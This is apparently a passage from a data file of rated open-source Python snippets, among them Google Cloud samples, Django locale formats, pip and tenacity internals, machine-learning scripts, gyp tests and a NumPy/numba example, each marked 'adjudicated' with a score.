self.run_dag(""example_gcp_datastore"", CLOUD_DAG_FOLDER)<<NEWL>><<NEWL>>    @provide_gcp_context(GCP_DATASTORE_KEY)<<NEWL>>    def test_run_example_dag_operations(self):<<NEWL>>        self.run_dag(""example_gcp_datastore_operations"", CLOUD_DAG_FOLDER)"
52	adjudicated	4	"#!/usr/bin/env python<<NEWL>><<NEWL>># Copyright 2019 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>>""""""<<NEWL>>command line application and sample code for creating an accessing a secret.<<NEWL>>""""""<<NEWL>><<NEWL>><<NEWL>>def quickstart(_project_id=None, _secret_id=None):<<NEWL>>    # [START secretmanager_quickstart]<<NEWL>>    # Import the Secret Manager client library.<<NEWL>>    from google.cloud import secretmanager<<NEWL>><<NEWL>>    # GCP project in which to store secrets in Secret Manager.<<NEWL>>    project_id = ""YOUR_PROJECT_ID""<<NEWL>><<NEWL>>    # ID of the secret to create.<<NEWL>>    secret_id = ""YOUR_SECRET_ID""<<NEWL>><<NEWL>>    # [END secretmanager_quickstart]<<NEWL>>    project_id = _project_id<<NEWL>>    secret_id = _secret_id<<NEWL>>    # [START secretmanager_quickstart]<<NEWL>>    # Create the Secret Manager client.<<NEWL>>    client = secretmanager.SecretManagerServiceClient()<<NEWL>><<NEWL>>    # Build the parent name from the project.<<NEWL>>    parent = f""projects/{project_id}""<<NEWL>><<NEWL>>    # Create the parent secret.<<NEWL>>    secret = client.create_secret(<<NEWL>>        request={<<NEWL>>            ""parent"": parent,<<NEWL>>            ""secret_id"": secret_id,<<NEWL>>            ""secret"": {""replication"": {""automatic"": {}}},<<NEWL>>        }<<NEWL>>    )<<NEWL>><<NEWL>>    # Add the secret version.<<NEWL>>    version = client.add_secret_version(<<NEWL>>        request={""parent"": secret.name, ""payload"": {""data"": b""hello world!""}}<<NEWL>>    )<<NEWL>><<NEWL>>    # Access the secret version.<<NEWL>>    response = client.access_secret_version(request={""name"": version.name})<<NEWL>><<NEWL>>    # Print the secret payload.<<NEWL>>    #<<NEWL>>    # WARNING: Do not print the secret in a production environment - this<<NEWL>>    # snippet is showing how to access the secret material.<<NEWL>>    payload = response.payload.data.decode(""UTF-8"")<<NEWL>>    print(""Plaintext: {}"".format(payload))<<NEWL>>    # [END secretmanager_quickstart]<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    quickstart()"
112	adjudicated	4	"# This file is distributed under the same license as the Django package.<<NEWL>>#<<NEWL>># The *_FORMAT strings use the Django date format syntax,<<NEWL>># see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date<<NEWL>>DATE_FORMAT = 'l, j F, Y'<<NEWL>>TIME_FORMAT = 'h:i a'<<NEWL>>DATETIME_FORMAT = 'j F, Y h:i a'<<NEWL>>YEAR_MONTH_FORMAT = 'F, Y'<<NEWL>>MONTH_DAY_FORMAT = 'j F'<<NEWL>>SHORT_DATE_FORMAT = 'j.M.Y'<<NEWL>>SHORT_DATETIME_FORMAT = 'j.M.Y H:i'<<NEWL>>FIRST_DAY_OF_WEEK = 1  # (Monday)<<NEWL>><<NEWL>># The *_INPUT_FORMATS strings use the Python strftime format syntax,<<NEWL>># see https://docs.python.org/library/datetime.html#strftime-strptime-behavior<<NEWL>># Kept ISO formats as they are in first position<<NEWL>>DATE_INPUT_FORMATS = [<<NEWL>>    '%Y-%m-%d', '%m/%d/%Y', '%m/%d/%y',     # '2006-10-25', '10/25/2006', '10/25/06'<<NEWL>>    '%d.%m.%Y', '%d.%m.%y',                 # '25.10.2006', '25.10.06'<<NEWL>>    # '%d %b %Y', '%d %b, %Y', '%d %b. %Y',   # '25 Oct 2006', '25 Oct, 2006', '25 Oct. 2006'<<NEWL>>    # '%d %B %Y', '%d %B, %Y',                # '25 October 2006', '25 October, 2006'<<NEWL>>]<<NEWL>>DATETIME_INPUT_FORMATS = [<<NEWL>>    '%Y-%m-%d %H:%M:%S',     # '2006-10-25 14:30:59'<<NEWL>>    '%Y-%m-%d %H:%M:%S.%f',  # '2006-10-25 14:30:59.000200'<<NEWL>>    '%Y-%m-%d %H:%M',        # '2006-10-25 14:30'<<NEWL>>    '%d.%m.%Y %H:%M:%S',     # '25.10.2006 14:30:59'<<NEWL>>    '%d.%m.%Y %H:%M:%S.%f',  # '25.10.2006 14:30:59.000200'<<NEWL>>    '%d.%m.%Y %H:%M',        # '25.10.2006 14:30'<<NEWL>>    '%d.%m.%y %H:%M:%S',     # '25.10.06 14:30:59'<<NEWL>>    '%d.%m.%y %H:%M:%S.%f',  # '25.10.06 14:30:59.000200'<<NEWL>>    '%d.%m.%y %H:%M',        # '25.10.06 14:30'<<NEWL>>    '%m/%d/%Y %H:%M:%S',     # '10/25/2006 14:30:59'<<NEWL>>    '%m/%d/%Y %H:%M:%S.%f',  # '10/25/2006 14:30:59.000200'<<NEWL>>    '%m/%d/%Y %H:%M',        # '10/25/2006 14:30'<<NEWL>>    '%m/%d/%y %H:%M:%S',     # '10/25/06 14:30:59'<<NEWL>>    '%m/%d/%y %H:%M:%S.%f',  # '10/25/06 14:30:59.000200'<<NEWL>>    '%m/%d/%y %H:%M',        # '10/25/06 14:30'<<NEWL>>]<<NEWL>>DECIMAL_SEPARATOR = '.'<<NEWL>>THOUSAND_SEPARATOR = "" ""<<NEWL>>NUMBER_GROUPING = 3"
283	adjudicated	2	"alphabet = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']<<NEWL>><<NEWL>>def caesar(start_text, shift_amount, cipher_direction):<<NEWL>>  end_text = """"<<NEWL>>  if cipher_direction == ""decode"":<<NEWL>>    shift_amount *= -1<<NEWL>>  for char in start_text:<<NEWL>>    #TODO-3: What happens if the user enters a number/symbol/space?<<NEWL>>    #Can you fix the code to keep the number/symbol/space when the text is encoded/decoded?<<NEWL>>    #e.g. start_text = ""meet me at 3""<<NEWL>>    #end_text = ""â¢â¢â¢â¢ â¢â¢ â¢â¢ 3""<<NEWL>>    if char in alphabet:<<NEWL>>      position = alphabet.index(char)<<NEWL>>      new_position = position + shift_amount<<NEWL>>      end_text += alphabet[new_position]<<NEWL>>    else:<<NEWL>>      end_text += char<<NEWL>>  print(f""Here's the {cipher_direction}d result: {end_text}"")<<NEWL>><<NEWL>>#TODO-1: Import and print the logo from art.py when the program starts.<<NEWL>>from art import logo<<NEWL>>print(logo)<<NEWL>><<NEWL>>#TODO-4: Can you figure out a way to ask the user if they want to restart the cipher program?<<NEWL>>#e.g. Type 'yes' if you want to go again. Otherwise type 'no'.<<NEWL>>#If they type 'yes' then ask them for the direction/text/shift again and call the caesar() function again?<<NEWL>>#Hint: Try creating a while loop that continues to execute the program if the user types 'yes'.<<NEWL>>should_end = False<<NEWL>>while not should_end:<<NEWL>><<NEWL>>  direction = input(""Type 'encode' to encrypt, type 'decode' to decrypt:\n"")<<NEWL>>  text = input(""Type your message:\n"").lower()<<NEWL>>  shift = int(input(""Type the shift number:\n""))<<NEWL>>  #TODO-2: What if the user enters a shift that is greater than the number of letters in the alphabet?<<NEWL>>  #Try running the program and entering a shift number of 45.<<NEWL>>  #Add some code so that the program continues to work even if the user enters a shift number greater than 26. <<NEWL>>  #Hint: Think about how you can use the modulus (%).<<NEWL>>  shift = shift % 26<<NEWL>><<NEWL>>  caesar(start_text=text, shift_amount=shift, cipher_direction=direction)<<NEWL>><<NEWL>>  restart = input(""Type 'yes' if you want to go again. Otherwise type 'no'.\n"")<<NEWL>>  if restart == ""no"":<<NEWL>>    should_end = True<<NEWL>>    print(""Goodbye"")<<NEWL>>    "
184	adjudicated	2	"# Copyright 2020 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#    http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>><<NEWL>>def batch_predict(project_id, model_id, input_uri, output_uri):<<NEWL>>    """"""Batch predict""""""<<NEWL>>    # [START automl_batch_predict]<<NEWL>>    from google.cloud import automl<<NEWL>><<NEWL>>    # TODO(developer): Uncomment and set the following variables<<NEWL>>    # project_id = ""YOUR_PROJECT_ID""<<NEWL>>    # model_id = ""YOUR_MODEL_ID""<<NEWL>>    # input_uri = ""gs://YOUR_BUCKET_ID/path/to/your/input/csv_or_jsonl""<<NEWL>>    # output_uri = ""gs://YOUR_BUCKET_ID/path/to/save/results/""<<NEWL>><<NEWL>>    prediction_client = automl.PredictionServiceClient()<<NEWL>><<NEWL>>    # Get the full path of the model.<<NEWL>>    model_full_id = f""projects/{project_id}/locations/us-central1/models/{model_id}""<<NEWL>><<NEWL>>    gcs_source = automl.GcsSource(input_uris=[input_uri])<<NEWL>><<NEWL>>    input_config = automl.BatchPredictInputConfig(gcs_source=gcs_source)<<NEWL>>    gcs_destination = automl.GcsDestination(output_uri_prefix=output_uri)<<NEWL>>    output_config = automl.BatchPredictOutputConfig(gcs_destination=gcs_destination)<<NEWL>><<NEWL>>    response = prediction_client.batch_predict(<<NEWL>>        name=model_full_id, input_config=input_config, output_config=output_config<<NEWL>>    )<<NEWL>><<NEWL>>    print(""Waiting for operation to complete..."")<<NEWL>>    print(<<NEWL>>        f""Batch Prediction results saved to Cloud Storage bucket. {response.result()}""<<NEWL>>    )<<NEWL>>    # [END automl_batch_predict]"
215	adjudicated	3	"""""""Stuff that differs in different Python versions and platform<<NEWL>>distributions.""""""<<NEWL>><<NEWL>>import logging<<NEWL>>import os<<NEWL>>import sys<<NEWL>><<NEWL>>__all__ = [""get_path_uid"", ""stdlib_pkgs"", ""WINDOWS""]<<NEWL>><<NEWL>><<NEWL>>logger = logging.getLogger(__name__)<<NEWL>><<NEWL>><<NEWL>>def has_tls() -> bool:<<NEWL>>    try:<<NEWL>>        import _ssl  # noqa: F401  # ignore unused<<NEWL>><<NEWL>>        return True<<NEWL>>    except ImportError:<<NEWL>>        pass<<NEWL>><<NEWL>>    from pip._vendor.urllib3.util import IS_PYOPENSSL<<NEWL>><<NEWL>>    return IS_PYOPENSSL<<NEWL>><<NEWL>><<NEWL>>def get_path_uid(path: str) -> int:<<NEWL>>    """"""<<NEWL>>    Return path's uid.<<NEWL>><<NEWL>>    Does not follow symlinks:<<NEWL>>        https://github.com/pypa/pip/pull/935#discussion_r5307003<<NEWL>><<NEWL>>    Placed this function in compat due to differences on AIX and<<NEWL>>    Jython, that should eventually go away.<<NEWL>><<NEWL>>    :raises OSError: When path is a symlink or can't be read.<<NEWL>>    """"""<<NEWL>>    if hasattr(os, ""O_NOFOLLOW""):<<NEWL>>        fd = os.open(path, os.O_RDONLY | os.O_NOFOLLOW)<<NEWL>>        file_uid = os.fstat(fd).st_uid<<NEWL>>        os.close(fd)<<NEWL>>    else:  # AIX and Jython<<NEWL>>        # WARNING: time of check vulnerability, but best we can do w/o NOFOLLOW<<NEWL>>        if not os.path.islink(path):<<NEWL>>            # older versions of Jython don't have `os.fstat`<<NEWL>>            file_uid = os.stat(path).st_uid<<NEWL>>        else:<<NEWL>>            # raise OSError for parity with os.O_NOFOLLOW above<<NEWL>>            raise OSError(f""{path} is a symlink; Will not return uid for symlinks"")<<NEWL>>    return file_uid<<NEWL>><<NEWL>><<NEWL>># packages in the stdlib that may have installation metadata, but should not be<<NEWL>># considered 'installed'.  this theoretically could be determined based on<<NEWL>># dist.location (py27:`sysconfig.get_paths()['stdlib']`,<<NEWL>># py26:sysconfig.get_config_vars('LIBDEST')), but fear platform variation may<<NEWL>># make this ineffective, so hard-coding<<NEWL>>stdlib_pkgs = {""python"", ""wsgiref"", ""argparse""}<<NEWL>><<NEWL>><<NEWL>># windows detection, covers cpython and ironpython<<NEWL>>WINDOWS = sys.platform.startswith(""win"") or (sys.platform == ""cli"" and os.name == ""nt"")"
355	adjudicated	2	import lightly.data as data<<NEWL>><<NEWL>># the collate function applies random transforms to the input images<<NEWL>>collate_fn = data.ImageCollateFunction(input_size=32, cj_prob=0.5)<<NEWL>>import torch<<NEWL>><<NEWL>># create a dataset from your image folder<<NEWL>>dataset = data.LightlyDataset(input_dir='./my/cute/cats/dataset/')<<NEWL>><<NEWL>># build a PyTorch dataloader<<NEWL>>dataloader = torch.utils.data.DataLoader(<<NEWL>>    dataset,                # pass the dataset to the dataloader<<NEWL>>    batch_size=128,         # a large batch size helps with the learning<<NEWL>>    shuffle=True,           # shuffling is important!<<NEWL>>    collate_fn=collate_fn)  # apply transformations to the input images<<NEWL>>import torchvision<<NEWL>><<NEWL>>from lightly.loss import NTXentLoss<<NEWL>>from lightly.models.modules.heads import SimCLRProjectionHead<<NEWL>><<NEWL>># use a resnet backbone<<NEWL>>resnet = torchvision.models.resnext101_64x4d()  # or efficientnet0_b0<<NEWL>>resnet = torch.nn.Sequential(*list(resnet.children())[:-1])<<NEWL>><<NEWL>># build a SimCLR model<<NEWL>>class SimCLR(torch.nn.Module):<<NEWL>>    def __init__(self, backbone, hidden_dim, out_dim):<<NEWL>>        super().__init__()<<NEWL>>        self.backbone = backbone<<NEWL>>        self.projection_head = SimCLRProjectionHead(hidden_dim, hidden_dim, out_dim)<<NEWL>><<NEWL>>    def forward(self, x):<<NEWL>>        h = self.backbone(x).flatten(start_dim=1)<<NEWL>>        z = self.projection_head(h)<<NEWL>>        return z<<NEWL>><<NEWL>>model = SimCLR(resnet, hidden_dim=512, out_dim=128)<<NEWL>><<NEWL>># use a criterion for self-supervised learning<<NEWL>># (normalized temperature-scaled cross entropy loss)<<NEWL>>criterion = NTXentLoss(temperature=0.5)<<NEWL>><<NEWL>># get a PyTorch optimizer<<NEWL>>optimizer = torch.optim.SGD(model.parameters(), lr=1e-0, weight_decay=1e-5)<<NEWL>>device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')<<NEWL>>max_epochs = 10<<NEWL>>for epoch in range(max_epochs):<<NEWL>>    for (x0, x1), _, _ in dataloader:<<NEWL>><<NEWL>>        x0 = x0.to(device)<<NEWL>>        x1 = x1.to(device)<<NEWL>><<NEWL>>        z0 = model(x0)<<NEWL>>        z1 = model(x1)<<NEWL>><<NEWL>>        loss = criterion(z0, z1)<<NEWL>>        loss.backward()<<NEWL>><<NEWL>>        optimizer.step()<<NEWL>>        optimizer.zero_grad()
244	adjudicated	2	"import os<<NEWL>>import json<<NEWL>><<NEWL>>import torch<<NEWL>>from PIL import Image<<NEWL>>from torchvision import transforms<<NEWL>>import matplotlib.pyplot as plt<<NEWL>><<NEWL>>from model import vgg<<NEWL>><<NEWL>><<NEWL>>def main():<<NEWL>>    device = torch.device(""cuda:0"" if torch.cuda.is_available() else ""cpu"")<<NEWL>><<NEWL>>    data_transform = transforms.Compose(<<NEWL>>        [transforms.Resize((224, 224)),<<NEWL>>         transforms.ToTensor(),<<NEWL>>         transforms.Normalize((0.5, 0.5, 0.5), (0.5, 0.5, 0.5))])<<NEWL>><<NEWL>>    # load image<<NEWL>>    img_path = ""../tulip.jpg""<<NEWL>>    assert os.path.exists(img_path), ""file: '{}' dose not exist."".format(img_path)<<NEWL>>    img = Image.open(img_path)<<NEWL>>    plt.imshow(img)<<NEWL>>    # [N, C, H, W]<<NEWL>>    img = data_transform(img)<<NEWL>>    # expand batch dimension<<NEWL>>    img = torch.unsqueeze(img, dim=0)<<NEWL>><<NEWL>>    # read class_indict<<NEWL>>    json_path = './class_indices.json'<<NEWL>>    assert os.path.exists(json_path), ""file: '{}' dose not exist."".format(json_path)<<NEWL>><<NEWL>>    with open(json_path, ""r"") as f:<<NEWL>>        class_indict = json.load(f)<<NEWL>>    <<NEWL>>    # create model<<NEWL>>    model = vgg(model_name=""vgg16"", num_classes=5).to(device)<<NEWL>>    # load model weights<<NEWL>>    weights_path = ""./vgg16Net.pth""<<NEWL>>    assert os.path.exists(weights_path), ""file: '{}' dose not exist."".format(weights_path)<<NEWL>>    model.load_state_dict(torch.load(weights_path, map_location=device))<<NEWL>><<NEWL>>    model.eval()<<NEWL>>    with torch.no_grad():<<NEWL>>        # predict class<<NEWL>>        output = torch.squeeze(model(img.to(device))).cpu()<<NEWL>>        predict = torch.softmax(output, dim=0)<<NEWL>>        predict_cla = torch.argmax(predict).numpy()<<NEWL>><<NEWL>>    print_res = ""class: {}   prob: {:.3}"".format(class_indict[str(predict_cla)],<<NEWL>>                                                 predict[predict_cla].numpy())<<NEWL>>    plt.title(print_res)<<NEWL>>    for i in range(len(predict)):<<NEWL>>        print(""class: {:10}   prob: {:.3}"".format(class_indict[str(i)],<<NEWL>>                                                  predict[i].numpy()))<<NEWL>>    plt.show()<<NEWL>><<NEWL>><<NEWL>>if __name__ == '__main__':<<NEWL>>    main()"
95	adjudicated	1	"# Copyright 2017 Elisey Zanko<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>># http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>import sys<<NEWL>>import typing<<NEWL>><<NEWL>>from pip._vendor.tenacity import BaseRetrying<<NEWL>>from pip._vendor.tenacity import DoAttempt<<NEWL>>from pip._vendor.tenacity import DoSleep<<NEWL>>from pip._vendor.tenacity import RetryCallState<<NEWL>><<NEWL>>from tornado import gen<<NEWL>><<NEWL>>if typing.TYPE_CHECKING:<<NEWL>>    from tornado.concurrent import Future<<NEWL>><<NEWL>>_RetValT = typing.TypeVar(""_RetValT"")<<NEWL>><<NEWL>><<NEWL>>class TornadoRetrying(BaseRetrying):<<NEWL>>    def __init__(self, sleep: ""typing.Callable[[float], Future[None]]"" = gen.sleep, **kwargs: typing.Any) -> None:<<NEWL>>        super().__init__(**kwargs)<<NEWL>>        self.sleep = sleep<<NEWL>><<NEWL>>    @gen.coroutine<<NEWL>>    def __call__(  # type: ignore  # Change signature from supertype<<NEWL>>        self,<<NEWL>>        fn: ""typing.Callable[..., typing.Union[typing.Generator[typing.Any, typing.Any, _RetValT], Future[_RetValT]]]"",<<NEWL>>        *args: typing.Any,<<NEWL>>        **kwargs: typing.Any,<<NEWL>>    ) -> ""typing.Generator[typing.Any, typing.Any, _RetValT]"":<<NEWL>>        self.begin()<<NEWL>><<NEWL>>        retry_state = RetryCallState(retry_object=self, fn=fn, args=args, kwargs=kwargs)<<NEWL>>        while True:<<NEWL>>            do = self.iter(retry_state=retry_state)<<NEWL>>            if isinstance(do, DoAttempt):<<NEWL>>                try:<<NEWL>>                    result = yield fn(*args, **kwargs)<<NEWL>>                except BaseException:  # noqa: B902<<NEWL>>                    retry_state.set_exception(sys.exc_info())<<NEWL>>                else:<<NEWL>>                    retry_state.set_result(result)<<NEWL>>            elif isinstance(do, DoSleep):<<NEWL>>                retry_state.prepare_for_next_attempt()<<NEWL>>                yield self.sleep(do)<<NEWL>>            else:<<NEWL>>                raise gen.Return(do)"
304	adjudicated	3	"# Copyright (c) Facebook, Inc. and its affiliates.<<NEWL>>#<<NEWL>># This source code is licensed under the MIT license found in the<<NEWL>># LICENSE file in the root directory of this source tree.<<NEWL>>""""""isort:skip_file""""""<<NEWL>><<NEWL>>import functools<<NEWL>>import importlib<<NEWL>><<NEWL>><<NEWL>>dependencies = [<<NEWL>>    ""dataclasses"",<<NEWL>>    ""hydra"",<<NEWL>>    ""numpy"",<<NEWL>>    ""omegaconf"",<<NEWL>>    ""regex"",<<NEWL>>    ""requests"",<<NEWL>>    ""torch"",<<NEWL>>]<<NEWL>><<NEWL>><<NEWL>># Check for required dependencies and raise a RuntimeError if any are missing.<<NEWL>>missing_deps = []<<NEWL>>for dep in dependencies:<<NEWL>>    try:<<NEWL>>        importlib.import_module(dep)<<NEWL>>    except ImportError:<<NEWL>>        # Hack: the hydra package is provided under the ""hydra-core"" name in<<NEWL>>        # pypi. We don't want the user mistakenly calling `pip install hydra`<<NEWL>>        # since that will install an unrelated package.<<NEWL>>        if dep == ""hydra"":<<NEWL>>            dep = ""hydra-core""<<NEWL>>        missing_deps.append(dep)<<NEWL>>if len(missing_deps) > 0:<<NEWL>>    raise RuntimeError(""Missing dependencies: {}"".format("", "".join(missing_deps)))<<NEWL>><<NEWL>><<NEWL>># only do fairseq imports after checking for dependencies<<NEWL>>from fairseq.hub_utils import (  # noqa; noqa<<NEWL>>    BPEHubInterface as bpe,<<NEWL>>    TokenizerHubInterface as tokenizer,<<NEWL>>)<<NEWL>>from fairseq.models import MODEL_REGISTRY  # noqa<<NEWL>><<NEWL>><<NEWL>># torch.hub doesn't build Cython components, so if they are not found then try<<NEWL>># to build them here<<NEWL>>try:<<NEWL>>    import fairseq.data.token_block_utils_fast  # noqa<<NEWL>>except ImportError:<<NEWL>>    try:<<NEWL>>        import cython  # noqa<<NEWL>>        import os<<NEWL>>        from setuptools import sandbox<<NEWL>><<NEWL>>        sandbox.run_setup(<<NEWL>>            os.path.join(os.path.dirname(__file__), ""setup.py""),<<NEWL>>            [""build_ext"", ""--inplace""],<<NEWL>>        )<<NEWL>>    except ImportError:<<NEWL>>        print(<<NEWL>>            ""Unable to build Cython components. Please make sure Cython is ""<<NEWL>>            ""installed if the torch.hub model you are loading depends on it.""<<NEWL>>        )<<NEWL>><<NEWL>><<NEWL>># automatically expose models defined in FairseqModel::hub_models<<NEWL>>for _model_type, _cls in MODEL_REGISTRY.items():<<NEWL>>    for model_name in _cls.hub_models().keys():<<NEWL>>        globals()[model_name] = functools.partial(<<NEWL>>            _cls.from_pretrained,<<NEWL>>            model_name,<<NEWL>>        )"
126	adjudicated	2	"#!/usr/bin/env python<<NEWL>><<NEWL>># Copyright (c) 2012 Google Inc. All rights reserved.<<NEWL>># Use of this source code is governed by a BSD-style license that can be<<NEWL>># found in the LICENSE file.<<NEWL>><<NEWL>>""""""Unit tests for the common.py file.""""""<<NEWL>><<NEWL>>import gyp.common<<NEWL>>import unittest<<NEWL>>import sys<<NEWL>><<NEWL>><<NEWL>>class TestTopologicallySorted(unittest.TestCase):<<NEWL>>  def test_Valid(self):<<NEWL>>    """"""Test that sorting works on a valid graph with one possible order.""""""<<NEWL>>    graph = {<<NEWL>>        'a': ['b', 'c'],<<NEWL>>        'b': [],<<NEWL>>        'c': ['d'],<<NEWL>>        'd': ['b'],<<NEWL>>        }<<NEWL>>    def GetEdge(node):<<NEWL>>      return tuple(graph[node])<<NEWL>>    self.assertEqual(<<NEWL>>      gyp.common.TopologicallySorted(graph.keys(), GetEdge),<<NEWL>>      ['a', 'c', 'd', 'b'])<<NEWL>><<NEWL>>  def test_Cycle(self):<<NEWL>>    """"""Test that an exception is thrown on a cyclic graph.""""""<<NEWL>>    graph = {<<NEWL>>        'a': ['b'],<<NEWL>>        'b': ['c'],<<NEWL>>        'c': ['d'],<<NEWL>>        'd': ['a'],<<NEWL>>        }<<NEWL>>    def GetEdge(node):<<NEWL>>      return tuple(graph[node])<<NEWL>>    self.assertRaises(<<NEWL>>      gyp.common.CycleError, gyp.common.TopologicallySorted,<<NEWL>>      graph.keys(), GetEdge)<<NEWL>><<NEWL>><<NEWL>>class TestGetFlavor(unittest.TestCase):<<NEWL>>  """"""Test that gyp.common.GetFlavor works as intended""""""<<NEWL>>  original_platform = ''<<NEWL>><<NEWL>>  def setUp(self):<<NEWL>>    self.original_platform = sys.platform<<NEWL>><<NEWL>>  def tearDown(self):<<NEWL>>    sys.platform = self.original_platform<<NEWL>><<NEWL>>  def assertFlavor(self, expected, argument, param):<<NEWL>>    sys.platform = argument<<NEWL>>    self.assertEqual(expected, gyp.common.GetFlavor(param))<<NEWL>><<NEWL>>  def test_platform_default(self):<<NEWL>>    self.assertFlavor('freebsd', 'freebsd9' , {})<<NEWL>>    self.assertFlavor('freebsd', 'freebsd10', {})<<NEWL>>    self.assertFlavor('openbsd', 'openbsd5' , {})<<NEWL>>    self.assertFlavor('solaris', 'sunos5'   , {});<<NEWL>>    self.assertFlavor('solaris', 'sunos'    , {});<<NEWL>>    self.assertFlavor('linux'  , 'linux2'   , {});<<NEWL>>    self.assertFlavor('linux'  , 'linux3'   , {});<<NEWL>><<NEWL>>  def test_param(self):<<NEWL>>    self.assertFlavor('foobar', 'linux2' , {'flavor': 'foobar'})<<NEWL>><<NEWL>><<NEWL>>if __name__ == '__main__':<<NEWL>>  unittest.main()"
66	adjudicated	3	"r""""""<<NEWL>>Building the required library in this example requires a source distribution<<NEWL>>of NumPy or clone of the NumPy git repository since distributions.c is not<<NEWL>>included in binary distributions.<<NEWL>><<NEWL>>On *nix, execute in numpy/random/src/distributions<<NEWL>><<NEWL>>export ${PYTHON_VERSION}=3.8 # Python version<<NEWL>>export PYTHON_INCLUDE=#path to Python's include folder, usually \<<NEWL>>    ${PYTHON_HOME}/include/python${PYTHON_VERSION}m<<NEWL>>export NUMPY_INCLUDE=#path to numpy's include folder, usually \<<NEWL>>    ${PYTHON_HOME}/lib/python${PYTHON_VERSION}/site-packages/numpy/core/include<<NEWL>>gcc -shared -o libdistributions.so -fPIC distributions.c \<<NEWL>>    -I${NUMPY_INCLUDE} -I${PYTHON_INCLUDE}<<NEWL>>mv libdistributions.so ../../_examples/numba/<<NEWL>><<NEWL>>On Windows<<NEWL>><<NEWL>>rem PYTHON_HOME and PYTHON_VERSION are setup dependent, this is an example<<NEWL>>set PYTHON_HOME=c:\Anaconda<<NEWL>>set PYTHON_VERSION=38<<NEWL>>cl.exe /LD .\distributions.c -DDLL_EXPORT \<<NEWL>>    -I%PYTHON_HOME%\lib\site-packages\numpy\core\include \<<NEWL>>    -I%PYTHON_HOME%\include %PYTHON_HOME%\libs\python%PYTHON_VERSION%.lib<<NEWL>>move distributions.dll ../../_examples/numba/<<NEWL>>""""""<<NEWL>>import os<<NEWL>><<NEWL>>import numba as nb<<NEWL>>import numpy as np<<NEWL>>from cffi import FFI<<NEWL>><<NEWL>>from numpy.random import PCG64<<NEWL>><<NEWL>>ffi = FFI()<<NEWL>>if os.path.exists('./distributions.dll'):<<NEWL>>    lib = ffi.dlopen('./distributions.dll')<<NEWL>>elif os.path.exists('./libdistributions.so'):<<NEWL>>    lib = ffi.dlopen('./libdistributions.so')<<NEWL>>else:<<NEWL>>    raise RuntimeError('Required DLL/so file was not found.')<<NEWL>><<NEWL>>ffi.cdef(""""""<<NEWL>>double random_standard_normal(void *bitgen_state);<<NEWL>>"""""")<<NEWL>>x = PCG64()<<NEWL>>xffi = x.cffi<<NEWL>>bit_generator = xffi.bit_generator<<NEWL>><<NEWL>>random_standard_normal = lib.random_standard_normal<<NEWL>><<NEWL>><<NEWL>>def normals(n, bit_generator):<<NEWL>>    out = np.empty(n)<<NEWL>>    for i in range(n):<<NEWL>>        out[i] = random_standard_normal(bit_generator)<<NEWL>>    return out<<NEWL>><<NEWL>><<NEWL>>normalsj = nb.jit(normals, nopython=True)<<NEWL>><<NEWL>># Numba requires a memory address for void *<<NEWL>># Can also get address from x.ctypes.bit_generator.value<<NEWL>>bit_generator_address = int(ffi.cast('uintptr_t', bit_generator))<<NEWL>><<NEWL>>norm = normalsj(1000, bit_generator_address)<<NEWL>>print(norm[:12])"
177	adjudicated	3	"# Copyright (c) Microsoft Corporation. All rights reserved.<<NEWL>># Licensed under the MIT License. See LICENSE in the project root<<NEWL>># for license information.<<NEWL>><<NEWL>>import sys<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    # debugpy can also be invoked directly rather than via -m. In this case, the first<<NEWL>>    # entry on sys.path is the one added automatically by Python for the directory<<NEWL>>    # containing this file. This means that import debugpy will not work, since we need<<NEWL>>    # the parent directory of debugpy/ to be in sys.path, rather than debugpy/ itself.<<NEWL>>    #<<NEWL>>    # The other issue is that many other absolute imports will break, because they<<NEWL>>    # will be resolved relative to debugpy/ - e.g. `import debugger` will then try<<NEWL>>    # to import debugpy/debugger.py.<<NEWL>>    #<<NEWL>>    # To fix both, we need to replace the automatically added entry such that it points<<NEWL>>    # at parent directory of debugpy/ instead of debugpy/ itself, import debugpy with that<<NEWL>>    # in sys.path, and then remove the first entry entry altogether, so that it doesn't<<NEWL>>    # affect any further imports we might do. For example, suppose the user did:<<NEWL>>    #<<NEWL>>    #   python /foo/bar/debugpy ...<<NEWL>>    #<<NEWL>>    # At the beginning of this script, sys.path will contain ""/foo/bar/debugpy"" as the<<NEWL>>    # first entry. What we want is to replace it with ""/foo/bar', then import debugpy<<NEWL>>    # with that in effect, and then remove the 